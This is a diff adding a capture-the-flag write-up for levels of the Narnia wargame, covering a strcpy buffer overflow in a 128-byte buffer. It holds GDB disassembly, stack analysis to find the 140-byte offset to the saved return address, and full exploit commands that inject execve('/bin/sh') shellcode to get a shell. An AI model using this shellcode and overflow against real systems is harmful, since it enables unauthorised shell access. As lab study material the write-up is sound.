@@ -52,4 +52,67 @@ int main(){
 }
 ```
 So this code is going to get an environmental variable and then execute it.  Therefore, we want to put some executable code in to an evironmental variable called EGG.  I used the shellcode for execve("/bin/sh") I found at http://shell-storm.org/shellcode/files/shellcode-811.php and issued the command `export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80"'``.  When I ran the program, I was given a shell as narnia2.
+#Level2
+```
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
+int main(int argc, char * argv[]){
+        char buf[128];
+
+        if(argc == 1){
+                printf("Usage: %s argument\n", argv[0]);
+			exit(1);
+        }
+        strcpy(buf,argv[1]);
+        printf("%s", buf);
+
+        return 0;
+}
+```
+In this level, the input that we pass the program is copied in to buf[128] using strcpy.  I played around with the inputs to the program and saw that when I sent it Ax139, the program executed with no problems, but when I sent it Ax140, it crashed with "Illegal instruction". 
+I opened it up in GDB to get a better idea of what I needed to overflow it with:
+```
+Dump of assembler code for function main:
+   0x0804845d <+0>:	push   ebp
+   0x0804845e <+1>:	mov    ebp,esp
+=> 0x08048460 <+3>:	and    esp,0xfffffff0
+   0x08048463 <+6>:	sub    esp,0x90
+   0x08048469 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804846d <+16>:	jne    0x8048490 <main+51>
+   0x0804846f <+18>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048472 <+21>:	mov    eax,DWORD PTR [eax]
+   0x08048474 <+23>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048478 <+27>:	mov    DWORD PTR [esp],0x8048560
+   0x0804847f <+34>:	call   0x8048310 <printf@plt>
+   0x08048484 <+39>:	mov    DWORD PTR [esp],0x1
+   0x0804848b <+46>:	call   0x8048340 <exit@plt>
+   0x08048490 <+51>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048493 <+54>:	add    eax,0x4
+   0x08048496 <+57>:	mov    eax,DWORD PTR [eax]
+   0x08048498 <+59>:	mov    DWORD PTR [esp+0x4],eax
+   0x0804849c <+63>:	lea    eax,[esp+0x10]
+   0x080484a0 <+67>:	mov    DWORD PTR [esp],eax
+   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
+   0x080484a8 <+75>:	lea    eax,[esp+0x10]
+   0x080484ac <+79>:	mov    DWORD PTR [esp+0x4],eax
+   0x080484b0 <+83>:	mov    DWORD PTR [esp],0x8048574
+   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
+   0x080484bc <+95>:	mov    eax,0x0
+   0x080484c1 <+100>:	leave  
+   0x080484c2 <+101>:	ret    
+End of assembler dump.
+(gdb) break *0x080484a3
+```
+I set a break point write before the call to strcpy() and ran the program with an input of 140 A's. (`r `perl -e 'print "A"x140'``)
+The syntax for strcpy is strcpy(char *dest,char *src).  Since I broke at strcpy, I can print out the stack to see what those two arguments are:
+```
+(gdb) x/4wx $esp
+0xffffd640:	0xffffd650	0xffffd8a4	0x00000000	0x00000000
+```
+The destination is at 0xffffd650 and the source is at 0xffffd8a4
+Additionally, with `info frame` I see that eip is saved at 0xffffd6dc.  0xffffd6dc-0xffffd650=0x8c(140 decimal), which confirms why we saw the program crashing early.  We have a couple of options of how to exploit at this point, but I'll choose the simples and place my shellcode in buf[] and overwrite eip with the location of buf[] since my shellcode is only 28 bytes so I have plenty of space for it.
+My shellcode will take 28 bytes, so will print my shellcode, then 140-28=112 A's and then my return address which is 0xffffd650.  Taking endianess in to account, the final exeuction is:
+`./narnia2 `perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80" . "A"x112 . "\x50\xd6\xff\xff"'``
+When I execute this I'm granted a shell as narnia3 
